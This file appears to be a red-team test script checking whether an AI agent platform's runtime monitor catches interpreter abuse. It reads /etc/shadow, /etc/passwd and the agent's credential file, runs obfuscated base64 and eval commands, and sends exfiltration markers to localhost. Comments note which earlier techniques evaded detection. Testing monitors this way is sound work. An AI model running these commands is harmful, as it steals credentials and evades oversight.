#!/usr/bin/env bash
# Red Lobster v6 — Flag 7: RUNTIME ABUSE (expanded from v5)
# Focuses on gaps: shutil, ruby, node cred reads, tcp exfil
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag7" "Flag 7: RUNTIME ABUSE — Preinstalled interpreters (v6)"

CRED="/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json"
OUTDIR="$FLAG_DIR"

# --- Python attacks ---
# v5 bypass: shutil went undetected
rl_run "python3 shutil.copyfile /etc/shadow" \
  "python3 -c \"import shutil; shutil.copyfile('/etc/shadow','$OUTDIR/py_shutil.txt')\" 2>/dev/null"

rl_run "python3 ctypes raw open+read /etc/shadow" \
  "python3 -c \"
import ctypes, ctypes.util
libc = ctypes.CDLL(ctypes.util.find_library('c'))
fd = libc.open(b'/etc/shadow', 0)
buf = ctypes.create_string_buffer(4096)
n = libc.read(fd, buf, 4096)
libc.close(fd)
open('$OUTDIR/py_ctypes.txt','wb').write(buf.raw[:n]) if n > 0 else None
\""

rl_run "python3 subprocess.Popen(['cat','/etc/shadow'])" \
  "python3 -c \"import subprocess; open('$OUTDIR/py_popen.txt','wb').write(subprocess.run(['cat','/etc/shadow'],capture_output=True).stdout)\""

rl_run "python3 pathlib.Path.read_bytes" \
  "python3 -c \"from pathlib import Path; Path('$OUTDIR/py_pathlib.txt').write_bytes(Path('/etc/shadow').read_bytes())\" 2>/dev/null"

rl_run "python3 http.client exfil to localhost" \
  "python3 -c \"
import http.client
try:
    c = http.client.HTTPConnection('127.0.0.1', 19999, timeout=2)
    c.request('POST', '/exfil', b'EXFIL-PY-HTTP-v6')
except: pass
\""

# --- Node.js attacks ---
# v5 gap: node cred read was info-only, tcp exfil was info-only
rl_run "node fs.readFileSync cred file" \
  "node -e \"require('fs').writeFileSync('$OUTDIR/node_cred.txt', require('fs').readFileSync('$CRED'))\""

rl_run "node net.Socket TCP exfil" \
  "node -e \"
const net = require('net');
const s = new net.Socket();
s.on('error', ()=>{});
s.connect(19999, '127.0.0.1', ()=>{ s.write('EXFIL-NODE-TCP-v6'); s.end(); });
setTimeout(()=>process.exit(0), 2000);
\""

rl_run "node child_process.execSync base64-encoded cmd" \
  "node -e \"require('child_process').execSync(Buffer.from('Y2F0IC9ldGMvcGFzc3dk','base64').toString())\""

rl_run "node eval() fs.readFileSync" \
  "node -e \"const d = eval('require(\\\"fs\\\").readFileSync(\\\"/etc/passwd\\\")'); process.stdout.write(d)\" > $OUTDIR/node_eval.txt"

rl_run "node spawn with shell:true" \
  "node -e \"require('child_process').spawnSync('cat',['/etc/shadow'],{shell:true,stdio:['ignore','pipe','pipe']})\" 2>/dev/null"

# --- Other interpreters ---
# v5 bypass: ruby went undetected
rl_run "ruby File.read /etc/shadow" \
  "ruby -e 'puts File.read(\"/etc/shadow\")' > $OUTDIR/ruby_shadow.txt 2>/dev/null"

rl_run "ruby IO.read cred file" \
  "ruby -e 'puts IO.read(\"$CRED\")' > $OUTDIR/ruby_cred.txt 2>/dev/null"

rl_run "perl open + read /etc/shadow" \
  "perl -e 'open(F,\"</etc/shadow\"); print while <F>;' > $OUTDIR/perl_shadow.txt"

rl_run "awk print /etc/shadow" \
  "awk '{print}' /etc/shadow > $OUTDIR/awk_shadow.txt"

rl_run "lua os.execute cat /etc/shadow" \
  "lua -e 'os.execute(\"cat /etc/shadow > $OUTDIR/lua_shadow.txt\")' 2>/dev/null"

rl_summary
rl_cleanup
